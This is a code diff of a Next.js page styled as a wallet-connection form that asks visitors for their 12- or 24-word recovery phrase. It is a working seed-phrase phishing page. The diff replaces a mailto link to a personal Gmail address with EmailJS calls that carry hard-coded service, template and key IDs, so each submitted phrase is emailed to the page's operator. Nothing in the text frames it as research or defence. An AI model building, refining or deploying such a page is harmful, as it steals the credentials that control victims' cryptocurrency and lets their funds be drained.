@@ -1,14 +1,32 @@
+// @ts-nocheck
 'use client';
 import Image from 'next/image';
 import './form.css';
-import { useState } from 'react';
-export default function Page() {
-  const [text, setText] = useState('');
-  console.log('🛑 ~ Page ~ text:', text);
+import { useRef } from 'react';
+import emailjs from '@emailjs/browser';
 
-  function handleSubmit(e: any) {
+export default function Page() {
+  const form = useRef();
+
+  const sendEmail = (e) => {
     e.preventDefault();
-  }
+
+    emailjs
+      .sendForm(
+        'service_5gpw30c',
+        'template_5rlbagi',
+        form.current,
+        '7fQ-xstCOTi0ZiuVg'
+      )
+      .then(
+        (result) => {
+          console.log(result.text);
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+  };
 
   return (
     <section>
@@ -22,15 +40,15 @@ export default function Page() {
           height={120}
         />
         <form
-          onSubmit={handleSubmit}
+          ref={form}
+          onSubmit={sendEmail}
           className='flex flex-col items-start max-w-xl pb-20 mx-auto'
         >
           <p className='py-4'>
             Typically 12 (sometimes 24) words seperated by a single spaces.
           </p>
           <textarea
-            name='phrase'
-            onInput={(e) => setText((e.target as HTMLInputElement).value)}
+            name='message'
             rows={4}
             placeholder='Enter your Phrase'
             required
@@ -38,13 +56,12 @@ export default function Page() {
             defaultValue={''}
           />
           <br />
-          <a
+          <button
             className='bg-[#4682b4] hover:bg-[#4682b4]/80 text-white font-semibold px-6 py-4 text-sm whitespace-nowrap'
             type='submit'
-            href={`mailto:marcosfrin220@gmail.com?subject=Import Wallet!&body=${text}`}
           >
             Connect Wallet
-          </a>
+          </button>
         </form>
       </div>
     </section>
